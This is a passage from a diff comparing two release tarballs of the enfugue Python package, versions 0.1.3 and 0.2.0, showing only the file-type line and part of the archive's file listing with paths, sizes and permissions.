# Comparing `tmp/enfugue-0.1.3.tar.gz` & `tmp/enfugue-0.2.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "enfugue-0.1.3.tar", last modified: Thu Jul  6 03:42:40 2023, max compression
+gzip compressed data, was "enfugue-0.2.0.tar", last modified: Sat Jul 29 19:49:57 2023, max compression
```

## Comparing `enfugue-0.1.3.tar` & `enfugue-0.2.0.tar`

### file list

```diff
@@ -1,259 +1,291 @@
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.845198 enfugue-0.1.3/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      202 2023-07-06 03:42:40.841198 enfugue-0.1.3/PKG-INFO
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.829199 enfugue-0.1.3/enfugue/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/__init__.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     4606 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/__main__.py
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.829199 enfugue-0.1.3/enfugue/api/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      314 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/api/__init__.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     2186 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/api/config.py
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.829199 enfugue-0.1.3/enfugue/api/controller/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      690 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/api/controller/__init__.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1345 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/api/controller/base.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     3638 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/api/controller/downloads.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    10348 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/api/controller/invocation.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    14784 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/api/controller/models.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    17819 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/api/controller/system.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     8447 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/api/downloads.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     8617 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/api/invocations.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    19203 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/api/manager.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    13881 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/api/server.py
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.829199 enfugue-0.1.3/enfugue/config/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     3002 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/config/cms-context.yml
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)       75 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/config/database.yml
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      170 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/config/enfugue.yml
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      119 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/config/logging.yml
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     2312 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/config/server.yml
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.829199 enfugue-0.1.3/enfugue/database/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      554 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/database/__init__.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      130 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/database/base.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      355 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/database/config.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      814 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/database/invocations.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1199 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/database/models.py
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.829199 enfugue-0.1.3/enfugue/diffusion/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/__init__.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      782 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/constants.py
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.829199 enfugue-0.1.3/enfugue/diffusion/edge/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/edge/__init__.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     4158 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/edge/detect.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1348 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/edge/hed.py
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.829199 enfugue-0.1.3/enfugue/diffusion/edge/mlsd/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      199 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/edge/mlsd/__init__.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     9546 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/edge/mlsd/model.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    24879 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/edge/mlsd/util.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    10752 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/engine.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    48637 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/manager.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    66127 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/pipeline.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    54605 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/plan.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    14172 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/process.py
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.829199 enfugue-0.1.3/enfugue/diffusion/rt/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      317 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/rt/__init__.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    12412 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/rt/engine.py
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.833199 enfugue-0.1.3/enfugue/diffusion/rt/model/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      465 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/rt/model/__init__.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     5684 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/rt/model/base.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     3110 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/rt/model/clip.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    13244 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/rt/model/controlledunet.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     7791 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/rt/model/controlnet.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     3770 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/rt/model/unet.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     2580 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/rt/model/vae.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     2671 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/rt/optimizer.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    15776 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/rt/pipeline.py
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.833199 enfugue-0.1.3/enfugue/diffusion/upscale/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     3932 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/upscale/__init__.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     6806 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/upscale/gfpganer.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    11443 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/util.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      619 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/diffusion/vision.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1152 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/enfugue.py
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.833199 enfugue-0.1.3/enfugue/interface/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    12980 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/interface/__init__.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     4429 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/interface/helpers.py
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.833199 enfugue-0.1.3/enfugue/partner/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/partner/__init__.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     4752 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/partner/civitai.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1925 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/server.py
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.825199 enfugue-0.1.3/enfugue/static/
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.833199 enfugue-0.1.3/enfugue/static/css/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      773 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/css/01-reset.min.css
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      497 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/css/02-variables.min.css
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      279 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/css/03-fonts.min.css
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    12952 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/css/04-base.min.css
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     7808 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/css/05-common.min.css
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      989 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/css/06-header.min.css
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     4241 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/css/07-main.min.css
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    18592 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/css/08-enfugue.min.css
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    18833 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/css/09-enfugue-nodes.min.css
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.825199 enfugue-0.1.3/enfugue/static/css/vendor/
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.833199 enfugue-0.1.3/enfugue/static/css/vendor/fa/
--rw-r--r--   0 benjamin  (1000) benjamin  (1000)    18620 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/css/vendor/fa/brands.min.css
--rw-r--r--   0 benjamin  (1000) benjamin  (1000)    80651 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/css/vendor/fa/fontawesome.min.css
--rw-r--r--   0 benjamin  (1000) benjamin  (1000)      606 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/css/vendor/fa/regular.min.css
--rw-r--r--   0 benjamin  (1000) benjamin  (1000)      598 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/css/vendor/fa/solid.min.css
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.825199 enfugue-0.1.3/enfugue/static/fonts/
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.825199 enfugue-0.1.3/enfugue/static/fonts/vendor/
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.833199 enfugue-0.1.3/enfugue/static/fonts/vendor/fa/
--rw-r--r--   0 benjamin  (1000) benjamin  (1000)   186112 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/fonts/vendor/fa/fa-brands-400.ttf
--rw-r--r--   0 benjamin  (1000) benjamin  (1000)   107460 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/fonts/vendor/fa/fa-brands-400.woff2
--rw-r--r--   0 benjamin  (1000) benjamin  (1000)    62048 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/fonts/vendor/fa/fa-regular-400.ttf
--rw-r--r--   0 benjamin  (1000) benjamin  (1000)    25096 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/fonts/vendor/fa/fa-regular-400.woff2
--rw-r--r--   0 benjamin  (1000) benjamin  (1000)   397728 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/fonts/vendor/fa/fa-solid-900.ttf
--rw-r--r--   0 benjamin  (1000) benjamin  (1000)   150472 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/fonts/vendor/fa/fa-solid-900.woff2
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.833199 enfugue-0.1.3/enfugue/static/html/
--rw-------   0 benjamin  (1000) benjamin  (1000)      165 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/html/base.html.j2
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.833199 enfugue-0.1.3/enfugue/static/html/body/
--rw-------   0 benjamin  (1000) benjamin  (1000)      187 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/html/body/body-base.html.j2
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.833199 enfugue-0.1.3/enfugue/static/html/body/content/
--rw-------   0 benjamin  (1000) benjamin  (1000)      379 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/html/body/content/content-admin.html.j2
--rw-------   0 benjamin  (1000) benjamin  (1000)      349 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/html/body/content/content-application.html.j2
--rw-------   0 benjamin  (1000) benjamin  (1000)      122 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/html/body/content/content-error.html.j2
--rw-------   0 benjamin  (1000) benjamin  (1000)      297 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/html/body/content/content-external.html.j2
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      876 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/html/body/content/content-login.html.j2
--rw-------   0 benjamin  (1000) benjamin  (1000)      166 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/html/body/content/content-template.html.j2
--rw-------   0 benjamin  (1000) benjamin  (1000)      399 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/html/body/external-base.html.j2
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.833199 enfugue-0.1.3/enfugue/static/html/body/footer/
--rw-------   0 benjamin  (1000) benjamin  (1000)       55 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/html/body/footer/footer-base.html.j2
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      759 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/html/body/footer/footer.html.j2
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.833199 enfugue-0.1.3/enfugue/static/html/body/header/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)       55 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/html/body/header/header-base.html.j2
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      140 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/html/body/header/header.html.j2
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.833199 enfugue-0.1.3/enfugue/static/html/head/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     2162 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/html/head/head-base.html.j2
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.833199 enfugue-0.1.3/enfugue/static/img/
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.837198 enfugue-0.1.3/enfugue/static/img/brand/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      852 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/img/brand/civit-ai-logo.svg
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1293 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/img/brand/civit-ai.png
--rwxrwxr-x   0 benjamin  (1000) benjamin  (1000)     1521 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/img/brand/ko-fi.png
--rwxrwxr-x   0 benjamin  (1000) benjamin  (1000)     1486 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/img/brand/patreon.png
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     9307 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/img/brand/tensorrt.png
--rwxrwxr-x   0 benjamin  (1000) benjamin  (1000)    63446 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/img/cloud-320.png
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.837198 enfugue-0.1.3/enfugue/static/img/favicon/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    13112 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/img/favicon/favicon-128x128.png
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     2235 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/img/favicon/favicon-16x16.png
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    38833 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/img/favicon/favicon-256x256.png
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     2827 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/img/favicon/favicon-32x32.png
--rwxrwxr-x   0 benjamin  (1000) benjamin  (1000)   160675 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/img/favicon/favicon-512x512.png
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     4987 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/img/favicon/favicon-64x64.png
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1150 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/img/favicon/favicon.ico
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.837198 enfugue-0.1.3/enfugue/static/js/
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.837198 enfugue-0.1.3/enfugue/static/js/application/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    12933 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/application/index.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.837198 enfugue-0.1.3/enfugue/static/js/base/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     3038 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/base/api.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    16960 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/base/builder.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1114 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/base/csv.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     9701 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/base/helpers.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      915 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/base/loader.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      350 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/base/mutex.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      549 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/base/publisher.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     3019 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/base/session.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     2396 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/base/watcher.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.837198 enfugue-0.1.3/enfugue/static/js/common/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1814 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/common/event-tracker.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     4554 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/common/history.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      441 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/common/notify.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      647 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/common/shadowbox.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     2469 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/common/tooltip.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.837198 enfugue-0.1.3/enfugue/static/js/config/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      706 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/config/index.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.837198 enfugue-0.1.3/enfugue/static/js/controller/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      845 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/base.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.837198 enfugue-0.1.3/enfugue/static/js/controller/common/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     7149 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/common/announcements.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     4531 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/common/downloads.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    12391 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/common/invocation.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     4836 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/common/model-manager.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     9067 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/common/model-picker.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.837198 enfugue-0.1.3/enfugue/static/js/controller/file/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      242 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/file/01-new.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      513 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/file/02-open.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      645 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/file/03-save.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     4132 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/file/04-history.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     2764 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/file/05-results.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.837198 enfugue-0.1.3/enfugue/static/js/controller/help/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     2637 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/help/01-about.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      338 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/help/02-documentation.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      337 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/help/03-discuss.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1298 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/index.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      393 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/menu.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.837198 enfugue-0.1.3/enfugue/static/js/controller/models/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     8688 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/models/01-civitait.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      284 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/models/02-manager.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      267 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/models/03-new.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.841198 enfugue-0.1.3/enfugue/static/js/controller/sidebar/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     3552 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/sidebar/01-canvas.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1671 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/sidebar/02-tweaks.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1323 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/sidebar/03-generation.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    11037 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/sidebar/04-upscale.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      900 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/sidebar/05-prompts.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     2616 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/sidebar/99-invoke.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.841198 enfugue-0.1.3/enfugue/static/js/controller/system/
